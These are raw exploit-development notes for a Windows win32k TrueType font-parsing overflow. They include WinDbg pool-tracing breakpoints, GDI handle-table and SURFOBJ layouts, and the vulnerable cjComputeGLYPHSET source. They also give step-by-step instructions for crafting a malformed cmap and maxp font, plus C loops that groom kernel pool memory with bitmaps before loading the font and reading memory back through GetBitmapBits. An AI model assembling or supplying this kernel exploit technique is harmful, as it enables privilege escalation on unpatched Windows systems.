


!peb	Dump formatted view of processes PEB (only some information)
r $peb	Dump address ob PEB. $peb == pseudo-register
dt ntdll!_PEB	Dump PEB struct
dt ntdll!_PEB @$peb -r	Recursively (-r) dump PEB of our process

  +0x094 GdiSharedHandleTable : 0x003b0000 Void
	GdiSharedHandleTable + 10 * (word)handle

typedef struct {
  PVOID pKernelAddress; // 0x00
  USHORT wProcessId; // 0x04
  USHORT wCount; // 0x06
  USHORT wUpper; // 0x08
  USHORT wType; // 0x0a
  PVOID pUserAddress; // 0xc
} GDICELL; // sizeof = 0x10

addr = PEB.GdiSharedHandleTable + (handle & 0xffff) * sizeof(GDICELL)

typedef struct {
  ULONG32 hHmgr;
  ULONG32 ulShareCount;
  WORD cExclusiveLock;
  WORD BaseFlags;
  ULONG32 Tid;
} BASEOBJECT; // sizeof = 0x10

typedef struct {
  BASEOBJECT BaseObject; // 0x00
  SURFOBJ SurfObj; // 0x10
  [...]
} SURFACE64;

typedef struct {
  ULONG32 dhsurf; // 0x00
  ULONG32 hsurf; // 0x04 == handle bitmap
  ULONG32 dhpdev; // 0x8
  ULONG32 hdev; // 0xc
  SIZEL sizlBitmap; // 0x10
  ULONG32 cjBits; // 0x18
  ULONG32 pvBits; // 0x1c
  ULONG32 pvScan0; // 0x20
  ULONG32 lDelta; // 0x24
  ULONG32 iUniq; // 0x28
  ULONG32 iBitmapFormat; // 0x2c
  USHORT iType; // 0x30
  USHORT fjBitmap; // 0x34
} SURFOBJ; // sizeof = 0x34

typedef struct {
  ULONG64 dhsurf; // 0x00
  ULONG64 hsurf; // 0x08
  ULONG64 dhpdev; // 0x10
  ULONG64 hdev; // 0x18
  SIZEL sizlBitmap; // 0x20
  ULONG64 cjBits; // 0x28
  ULONG64 pvBits; // 0x30
  ULONG64 pvScan0; // 0x38
  ULONG32 lDelta; // 0x40
  ULONG32 iUniq; // 0x44
  ULONG32 iBitmapFormat; // 0x48
  USHORT iType; // 0x4C
  USHORT fjBitmap; // 0x4E
} SURFOBJ64; // sizeof = 0x50
	
kd> dd 003b0000  + 10 * [71a]
003b71a0  fe5a0408 00000e1c 40050b05 00000000
003b71b0  ffb76950 00000000 40040a04 00000000
003b71c0  fe66d778 00000e1c 40051005 00000000
003b71d0  fe4b3c08 00000e1c 40050705 00000000
003b71e0  fe9ab008 00000e1c 40050905 00000000
003b71f0  fe598008 00000e1c 40050705 00000000
003b7200  fe4e9c08 00000e1c 40050705 00000000
003b7210  fe9ab508 00000e1c 40050905 00000000
kd> dd fe5a0408
fe5a0408  0b05071a 00000000 00000000 00000000
fe5a0418  00000000 0b05071a 00000000 00000000
fe5a0428  00000011 0000000a 000002a8 fe5a0554	// size = 17 * 10
fe5a0438  fe5a0554 00000044 000021e9 00000006
fe5a0448  00010000 00000000 04800200 00000000
fe5a0458  00000000 00000000 00000000 00000000
fe5a0468  00000000 00000000 00000000 00000000
fe5a0478  00000000 00000000 00000000 00000000
	
kd> dd fe5a0554		// bits set by 0
fe5a0554  00000000 00000000 00000000 00000000
fe5a0564  00000000 00000000 00000000 00000000
fe5a0574  00000000 00000000 00000000 00000000
fe5a0584  00000000 00000000 00000000 00000000
fe5a0594  00000000 00000000 00000000 00000000
fe5a05a4  00000000 00000000 00000000 00000000
fe5a05b4  00000000 00000000 00000000 00000000
fe5a05c4  00000000 00000000 00000000 00000000


offset to bitmap: 32 bit: 14c
offset to bitmap: 64 bit: 228


!pool address
ba e1 nt!ExFreePoolWithTag ".printf \"Free:%p\",poi(esp+4);.echo;g" 
ba e1 nt!ExFreePoolWithTag ".printf \"Free:%p\",poi(esp+4);.echo;.if (poi(esp+4) != 0xfe6c82e8) {g;}" 
ba e1 win32k!EngFreeMem

ba e1 nt!ExAllocatePoolWithTag ".if (poi(esp+c) != 0x64667454) {g;}.else{.printf \"Alloc:%p\",poi(esp+8);.echo;}"
ba e1 win32k!EngAllocMem ".if (poi(esp+c) != 0x64667454) {g;}.else{.printf \"Alloc:%p\",poi(esp+8);.echo;}"
ba e1 win32k!EngAllocMem+71 ".printf \"Alloc:%p\",eax;.echo;g" 


ba e1 win32k!cjComputeGLYPHSET_MSFT_GENERAL+c4 "p;!pool eax;g" 
fe6c82e8

NtGdiGetBitmapBits
NtGdiSetBitmapBits

ttfdSemLoadFontFile
	bLoadFontFile
		bLoadTTF
			bLoadGlyphSet
				cjComputeGLYPHSET_MSFT_GENERAL+c4
				bLoadGlyphSet+4b
				bVerifyTTF+0x101
				
		64b		cjComputeGLYPHSET_MSFT_GENERAL+0xf1
				
ttfdSemQueryFontTree
	ttfdQueryFontTree
		bReloadGlyphSet
			bLoadGlyphSet
			
			
			
- fix cmap number of counts:
	fix segCountX2
	fix endcounts
	fix startcounts
	fix idDelta
	fix idRangeOffset
	fix size of cmap table
	fix offset of all table after cmap
	
- fix number of glyp
	fix numpGlyp in maxp table = 0xffff (max glyp so id + idDelta < 0xffff to write into buffer overflow)
	fix loca table
	fix size of loca table
	fix offset of all table after loca
			
- set idRangeOffset all elem = 0x0
- set idDelta all elem = 0x1
- change cmap (startcount, endcount, idDelta) to set idx 0xff7f = 0x0
	change startcount
	change endcount
	set idDelta 125 = 0x7f
	
			
nt!ExpNumberOfPagedPools
nt!ExpNumberOfNonPagedPools
nt!ExpPagedPoolDescriptor
nt!ExpNonPagedPoolDescriptor
nt!PoolVector

dt nt!_POOL_DESCRIPTOR poi(nt!PoolVector)

dt nt!_POOL_HEADER addr

PoolVector pointer to array of pool description

!poolfind Ttfd 0
			
dt nt!_MM_SESSION_SPACE
kd> dt nt!_POOL_DESCRIPTOR
   +0x000 PoolType         : _POOL_TYPE
   +0x004 PagedLock        : _KGUARDED_MUTEX
   +0x004 NonPagedLock     : Uint4B
   +0x040 RunningAllocs    : Int4B
   +0x044 RunningDeAllocs  : Int4B
   +0x048 TotalBigPages    : Int4B
   +0x04c ThreadsProcessingDeferrals : Int4B
   +0x050 TotalBytes       : Uint4B
   +0x080 PoolIndex        : Uint4B
   +0x0c0 TotalPages       : Int4B
   +0x100 PendingFrees     : Ptr32 Ptr32 Void
   +0x104 PendingFreeDepth : Int4B
   +0x140 ListHeads        : [512] _LIST_ENTRY
			
			
			
			
			
			
================================
64 bits
================================
dq %fffff900`c1c70ad0

dq win32k!gpentHmgr
dq %fffff900`c0200000 + 18 * 21b << handle








			
	int k = 0;
	HBITMAP hBitmaps[0x10] = { 0 };
	while (found == 0 && k < 1000) {

		hBitmapslarge[k] = CreateBitmap(largebitmapw, largebitmaph, 1, 32, buflarge);
		k++;

		for (i = 0; i < 0x4; i++)
		{
			if (is64)
				CreateBitmap(smallbitmapw64, smallbitmaph64, 1, 32, buf64);
			else
				hBitmap = CreateBitmap(smallbitmapw32, smallbitmaph32, 1, 32, buf32);

			tmp[0] = handleaddr(hBitmap);

			for (j = 0; j < k; j++)
			{
				if (handleaddr(hBitmapslarge[j]) - tmp[0] == 0xff8)
				{
					__debugbreak();

					//__debugbreak();

					////free object 
					//for (j = 0; j < 0x10; j++)
					//{
					//	DeleteObject(hBitmaps[j]);
					//}

					//DeleteObject(hBitmapslarge[i]);

					fhandle = AddFontMemResourceEx(foofont, sizeof(foofont), 0, (DWORD*)&tmp[0]);

					__debugbreak();

					GetBitmapBits(hBitmapslarge[j], sizeof(lastbytes), lastbytes);

					found = 1;
					break;
				}
			}
		}

	}
			
			
	int k = 0;
	HBITMAP hBitmaps[0x10] = { 0 };
	while (found == 0 && k < 1000) {
		for (i = 0; i < 0x10; i++)
		{
			if (is64)
				CreateBitmap(smallbitmapw64, smallbitmaph64, 1, 32, buf64);
			else
				hBitmaps[i] = CreateBitmap(smallbitmapw32, smallbitmaph32, 1, 32, buf32);
		}

		tmp[0] = handleaddr(hBitmaps[0xf]);

		hBitmapslarge[k] = CreateBitmap(largebitmapw, largebitmaph, 1, 32, buflarge);
		k++;

		for (i = 0; i < k; i++)
		{
			if (handleaddr(hBitmapslarge[i]) - tmp[0] == 0xff8)
			{
				__debugbreak();

				//free object 
				for (j = 0; j < 0x10; j++)
				{
					DeleteObject(hBitmaps[j]);
				}

				//DeleteObject(hBitmapslarge[i]);

				fhandle = AddFontMemResourceEx(foofont, sizeof(foofont), 0, (DWORD*)&tmp[0]);

				__debugbreak();

				GetBitmapBits(hBitmapslarge[i], sizeof(lastbytes), lastbytes);

				found = 1;
				break;
			}
		}
	}
			
			
			
STATIC ULONG cjComputeGLYPHSET_MSFT_GENERAL
(
sfnt_mappingTable     *pmap,
ULONG                **ppgset,
CMAPINFO              *pcmi
)
{
    USHORT  cSegments;
    uint16 *pendCountKeep , *pstartCountKeep , *pendCount , *pstartCount;
    uint16 *pidDelta, *pRangeOffset, *pGlyphArray;

    USHORT  cChars;

    USHORT  ii;

    MbcsToIndex *MITable;
    USHORT       MICount;

    ULONG   cjGlyphSet;

    cSegments       = BE_UINT16((PBYTE)pmap + OFF_segCountX2) / 2;
    pendCountKeep   = pendCount   = (uint16 *)((PBYTE)pmap + OFF_endCount);
    pstartCountKeep = pstartCount = (uint16 *)(pendCount + (cSegments + 1));
    pidDelta                      = (uint16 *) pstartCount + (cSegments * 1);
    pRangeOffset                  = (uint16 *) pstartCount + (cSegments * 2);
    pGlyphArray                   = (uint16 *) pstartCount + (cSegments * 3);

#ifdef DBG_GLYPHSET
    TtfdDbgPrint("cSegments   - %x\n",cSegments   );
    TtfdDbgPrint("pstart      - %x\n",pstartCount );
    TtfdDbgPrint("pGlyphArray - %x\n",pGlyphArray );
    TtfdDbgBreakPoint();
#endif // DBG_GLYPHSET

// Compute how many chars in this table

    cChars = 0;

    for( ii = 0 ; ii < cSegments - 1 ; ii ++ , pendCount ++ , pstartCount ++ )
        cChars += (BE_UINT16(pendCount) - BE_UINT16(pstartCount) + 1);

#ifdef DBG_GLYPHSET
    TtfdDbgPrint("cChars - %x\n",cChars);
#endif // DBG_GLYPHSET

// Alloc memory for MbcsToIndex table

    MITable = PV_ALLOC( sizeof(MbcsToIndex) * cChars );

    if( MITable == NULL )
    {
        WARNING("TTFD!cjComputeGLYPHSET_MSFT_GENERAL() PV_ALLOC() fail\n");
        *ppgset = NULL;
        return( 0 );
    }

// Fill up MbcsToIndex table

    pendCount   = pendCountKeep;
    pstartCount = pstartCountKeep;

    MICount = 0;

    for( ii = 0 ; ii < cSegments - 1 ; ii ++ , pendCount ++ , pstartCount ++ )
    {
        USHORT usStart , usEnd;
        USHORT jj;

        usStart = BE_UINT16(pstartCount);
        usEnd   = BE_UINT16(pendCount);

#ifdef DBG_GLYPHSET
        TtfdDbgPrint("usStart - %x\n",usStart);
        TtfdDbgPrint("usEnd   - %x\n",usEnd);
#endif // DBG_GLYPHSET

    // Check order

        if( usStart > usEnd ) WARNING("TTFD!usStart > usEnd\n");

        for( jj = usStart ; jj <= usEnd ; jj ++ )
        {
            *(ULONG  *)(MITable[MICount].MbcsChar) = (LONG)0;

            if( usStart > 0xFF )
                *(USHORT *)(MITable[MICount].MbcsChar) = ((jj >> 8) | (jj << 8));
             else
                *(USHORT *)(MITable[MICount].MbcsChar) = jj;

            if( pRangeOffset[ii] == 0 )
                MITable[MICount].hGlyph = (USHORT)(jj + BE_UINT16(pidDelta + ii));
             else
               MITable[MICount].hGlyph =
                 (USHORT)(BE_UINT16((USHORT *)&pRangeOffset[ii] +
                          BE_UINT16(&pRangeOffset[ii])/2+(jj-usStart)) +
                          BE_UINT16( pidDelta + ii ));
            MICount++;
        }
    }

#ifdef DBG_GLYPHSET
    TtfdDbgPrint("MICount - %x\n",MICount);
#endif

    ASSERTDD( cChars == MICount , "cChars != MICount - 1\n" );

#ifdef DBG_GLYPHSET
// Dump MITable
    for( ii = 0 ; ii < MICount ; ii++ )
    {
        TtfdDbgPrint("MbcsChar - %2x%2x : hGlyph - %x \n"
                     ,MITable[ii].MbcsChar[0] ,
                     MITable[ii].MbcsChar[1] ,
                     MITable[ii].hGlyph );
    }
#endif // DBG_GLYPHSET

    cjGlyphSet = CreateGlyphSetFromMITable( pcmi, MITable, MICount, ppgset );

    V_FREE( MITable );

    return( cjGlyphSet );
}



kd> dt nt!_PEB
   +0x000 InheritedAddressSpace : UChar
   +0x001 ReadImageFileExecOptions : UChar
   +0x002 BeingDebugged    : UChar
   +0x003 BitField         : UChar
   +0x003 ImageUsesLargePages : Pos 0, 1 Bit
   +0x003 IsProtectedProcess : Pos 1, 1 Bit
   +0x003 IsLegacyProcess  : Pos 2, 1 Bit
   +0x003 IsImageDynamicallyRelocated : Pos 3, 1 Bit
   +0x003 SkipPatchingUser32Forwarders : Pos 4, 1 Bit
   +0x003 SpareBits        : Pos 5, 3 Bits
   +0x004 Mutant           : Ptr32 Void
   +0x008 ImageBaseAddress : Ptr32 Void
   +0x00c Ldr              : Ptr32 _PEB_LDR_DATA
   +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS
   +0x014 SubSystemData    : Ptr32 Void
   +0x018 ProcessHeap      : Ptr32 Void
   +0x01c FastPebLock      : Ptr32 _RTL_CRITICAL_SECTION
   +0x020 AtlThunkSListPtr : Ptr32 Void
   +0x024 IFEOKey          : Ptr32 Void
   +0x028 CrossProcessFlags : Uint4B
   +0x028 ProcessInJob     : Pos 0, 1 Bit
   +0x028 ProcessInitializing : Pos 1, 1 Bit
   +0x028 ProcessUsingVEH  : Pos 2, 1 Bit
   +0x028 ProcessUsingVCH  : Pos 3, 1 Bit
   +0x028 ProcessUsingFTH  : Pos 4, 1 Bit
   +0x028 ReservedBits0    : Pos 5, 27 Bits
   +0x02c KernelCallbackTable : Ptr32 Void
   +0x02c UserSharedInfoPtr : Ptr32 Void
   +0x030 SystemReserved   : [1] Uint4B
   +0x034 AtlThunkSListPtr32 : Uint4B
   +0x038 ApiSetMap        : Ptr32 Void
   +0x03c TlsExpansionCounter : Uint4B
   +0x040 TlsBitmap        : Ptr32 Void
   +0x044 TlsBitmapBits    : [2] Uint4B
   +0x04c ReadOnlySharedMemoryBase : Ptr32 Void
   +0x050 HotpatchInformation : Ptr32 Void
   +0x054 ReadOnlyStaticServerData : Ptr32 Ptr32 Void
   +0x058 AnsiCodePageData : Ptr32 Void
   +0x05c OemCodePageData  : Ptr32 Void
   +0x060 UnicodeCaseTableData : Ptr32 Void
   +0x064 NumberOfProcessors : Uint4B
   +0x068 NtGlobalFlag     : Uint4B
   +0x070 CriticalSectionTimeout : _LARGE_INTEGER
   +0x078 HeapSegmentReserve : Uint4B
   +0x07c HeapSegmentCommit : Uint4B
   +0x080 HeapDeCommitTotalFreeThreshold : Uint4B
   +0x084 HeapDeCommitFreeBlockThreshold : Uint4B
   +0x088 NumberOfHeaps    : Uint4B
   +0x08c MaximumNumberOfHeaps : Uint4B
   +0x090 ProcessHeaps     : Ptr32 Ptr32 Void
   +0x094 GdiSharedHandleTable : Ptr32 Void
   +0x098 ProcessStarterHelper : Ptr32 Void
   +0x09c GdiDCAttributeList : Uint4B
   +0x0a0 LoaderLock       : Ptr32 _RTL_CRITICAL_SECTION
   +0x0a4 OSMajorVersion   : Uint4B
   +0x0a8 OSMinorVersion   : Uint4B
   +0x0ac OSBuildNumber    : Uint2B
   +0x0ae OSCSDVersion     : Uint2B
   +0x0b0 OSPlatformId     : Uint4B
   +0x0b4 ImageSubsystem   : Uint4B
   +0x0b8 ImageSubsystemMajorVersion : Uint4B
   +0x0bc ImageSubsystemMinorVersion : Uint4B
   +0x0c0 ActiveProcessAffinityMask : Uint4B
   +0x0c4 GdiHandleBuffer  : [34] Uint4B
   +0x14c PostProcessInitRoutine : Ptr32     void 
   +0x150 TlsExpansionBitmap : Ptr32 Void
   +0x154 TlsExpansionBitmapBits : [32] Uint4B
   +0x1d4 SessionId        : Uint4B
   +0x1d8 AppCompatFlags   : _ULARGE_INTEGER
   +0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER
   +0x1e8 pShimData        : Ptr32 Void
   +0x1ec AppCompatInfo    : Ptr32 Void
   +0x1f0 CSDVersion       : _UNICODE_STRING
   +0x1f8 ActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA
   +0x1fc ProcessAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP
   +0x200 SystemDefaultActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA
   +0x204 SystemAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP
   +0x208 MinimumStackCommit : Uint4B
   +0x20c FlsCallback      : Ptr32 _FLS_CALLBACK_INFO
   +0x210 FlsListHead      : _LIST_ENTRY
   +0x218 FlsBitmap        : Ptr32 Void
   +0x21c FlsBitmapBits    : [4] Uint4B
   +0x22c FlsHighIndex     : Uint4B
   +0x230 WerRegistrationData : Ptr32 Void
   +0x234 WerShipAssertPtr : Ptr32 Void
   +0x238 pContextData     : Ptr32 Void
   +0x23c pImageHeaderHash : Ptr32 Void
   +0x240 TracingFlags     : Uint4B
   +0x240 HeapTracingEnabled : Pos 0, 1 Bit
   +0x240 CritSecTracingEnabled : Pos 1, 1 Bit
   +0x240 SpareTracingBits : Pos 2, 30 Bits